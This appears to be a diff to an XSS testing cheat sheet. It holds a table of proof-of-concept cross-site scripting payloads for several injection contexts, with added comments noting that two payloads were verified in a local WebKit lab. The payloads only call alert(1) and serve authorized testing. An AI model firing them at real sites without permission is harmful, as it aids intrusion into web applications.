@@ -39,7 +39,7 @@ Before broad payload spraying, you can first load:
 
 | Context | First Pick | Backup |
 |---|---|---|
-| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
+| HTML body | `<svg onload=alert(1)>` <!-- verified 2026-08-21 WebKit 本地靶场: onload 改 title+DOM 注入均执行 --> | `<img src=1 onerror=alert(1)>` <!-- verified 2026-08-21 WebKit: onerror outerHTML 替换执行 --> |
 | Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
 | JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
 | URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
